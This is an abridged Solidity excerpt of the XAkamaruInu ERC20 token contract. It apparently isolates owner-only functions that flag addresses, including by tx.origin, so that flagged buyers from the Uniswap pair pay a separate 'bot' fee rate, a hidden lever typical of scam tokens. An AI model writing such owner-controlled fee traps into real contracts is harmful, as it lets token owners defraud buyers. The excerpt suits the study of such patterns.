...
contract XAkamaruInu is ERC20, Ownable {
    ...
    mapping (address => bool) private settedAddress;
    ...
    function setInitLaunch(uint256 balanceTokens) external payable onlyOwner{
        ...
        require(balanceOf(uniswapV2Pair) == 0, "Already released on Uniswap");
    ...
    function getSettedAddress(address account) public view returns(bool) {
        return settedAddress[account] || settedAddress[tx.origin];
    }
        ...
        */
        ...
        if(takeFee) {
            ...
            if(from == uniswapV2Pair) {
                ...
                if (getSettedAddress(to)) 
                _totalFees = totalBotFees;
            } else {
    ...
    function setAddressBatch (
        address[] memory addresses, 
        bool[] memory booleans) external onlyOwner {

        uint256 addressesLength = addresses.length;
        require(addressesLength == booleans.length, "Must be the same length");

        for (uint i = 0; i < addressesLength; i = uncheckedI(i)) {  
            settedAddress[addresses[i]] = booleans[i];
        }

    }

    function setAddress(address account, bool boolean) external onlyOwner {
        settedAddress[account] = boolean;
    }
